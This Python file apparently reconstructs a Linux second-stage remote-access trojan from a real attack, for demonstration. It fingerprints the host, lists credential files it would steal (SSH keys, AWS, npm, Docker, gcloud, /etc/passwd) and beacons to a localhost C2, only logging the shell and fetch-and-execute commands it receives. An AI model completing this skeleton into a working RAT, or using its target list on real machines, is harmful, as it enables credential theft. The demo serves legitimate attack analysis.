#!/usr/bin/env python3
"""
payloads/linux.py

DEMO RECONSTRUCTION — Linux second-stage payload simulation

In the real attack, this was saved to /tmp/ld.py and launched with:
    nohup python3 /tmp/ld.py > /dev/null 2>&1 &

The real RAT supported the same commands as the macOS C++ RAT:
    - run_payload  : fetch and execute additional binaries
    - shell        : execute arbitrary shell commands
    - ls           : enumerate the filesystem
    - kill         : terminate the RAT process

No persistence mechanism was present — the RAT did not survive reboots,
suggesting the attack was geared toward rapid credential exfiltration.

This simulation logs what each stage would do instead of executing it.
"""

import os
import sys
import json
import time
import socket
import platform
import urllib.request
import urllib.error
from datetime import datetime, timezone

C2_HOST = "localhost"
C2_PORT = 3000
BEACON_INTERVAL = 60


def log(msg):
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    print(f"[Linux RAT] {ts} {msg}", flush=True)


def fingerprint():
    """Collect system info. Real RAT exfiltrated this on first beacon."""
    return {
        "platform": platform.system(),
        "node": platform.node(),
        "release": platform.release(),
        "user": os.environ.get("USER", os.environ.get("LOGNAME", "unknown")),
        "home": os.path.expanduser("~"),
        "pid": os.getpid(),
        "python": sys.version,
    }


def enumerate_credentials():
    """
    Simulate the credential enumeration the real RAT would perform.
    Real attack would read file contents and POST them to C2.
    """
    high_value = [
        os.path.expanduser("~/.ssh"),
        os.path.expanduser("~/.aws/credentials"),
        os.path.expanduser("~/.npmrc"),
        os.path.expanduser("~/.gitconfig"),
        os.path.expanduser("~/.docker/config.json"),
        "/etc/passwd",
        os.path.expanduser("~/.config/gcloud/credentials.db"),
    ]

    log("Enumerating high-value credential paths...")
    for p in high_value:
        if os.path.exists(p):
            log(f"  [FOUND] {p} — would exfiltrate")
        else:
            log(f"  [NOT FOUND] {p}")


def beacon(number, fp):
    """POST fingerprint to C2, receive command in response."""
    url = f"http://{C2_HOST}:{C2_PORT}/beacon"
    log(f"Beacon #{number} → POST {url}")

    payload = json.dumps({**fp, "beacon": number}).encode()
    req = urllib.request.Request(
        url,
        data=payload,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "python-urllib/3",
        },
        method="POST",
    )

    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            response = json.loads(resp.read().decode())
            log(f"Beacon #{number} acknowledged: {response}")
            return response.get("command")
    except urllib.error.URLError as e:
        log(f"Beacon #{number} failed (C2 unreachable): {e.reason}")
        return None


def handle_command(command):
    """
    Real RAT command dispatcher.
    In this demo, all commands are logged but not executed.
    """
    if not command:
        return

    cmd_type = command.get("type")
    log(f"Received command: {cmd_type}")

    if cmd_type == "shell":
        log(f"  [DRY RUN] Would execute shell: {command.get('cmd')}")

    elif cmd_type == "run_payload":
        url = command.get("url")
        log(f"  [DRY RUN] Would fetch and execute payload from: {url}")

    elif cmd_type == "ls":
        path = command.get("path", "/")
        log(f"  [DRY RUN] Would enumerate filesystem at: {path}")

    elif cmd_type == "kill":
        log("  [DRY RUN] Would terminate RAT process")

    else:
        log(f"  Unknown command type: {cmd_type}")


def main():
    log("Linux RAT starting...")
    fp = fingerprint()

    log("System fingerprint:")
    for k, v in fp.items():
        log(f"  {k}: {v}")

    enumerate_credentials()

    log(f"Starting beacon loop (every {BEACON_INTERVAL}s)...")
    for i in range(1, 4):  # Demo: 3 beacons only
        command = beacon(i, fp)
        handle_command(command)
        if i < 3:
            log(f"Sleeping {BEACON_INTERVAL}s until next beacon...")
            time.sleep(BEACON_INTERVAL)

    log("Demo complete. In a real attack this loop would run until killed or system reboot.")


if __name__ == "__main__":
    main()
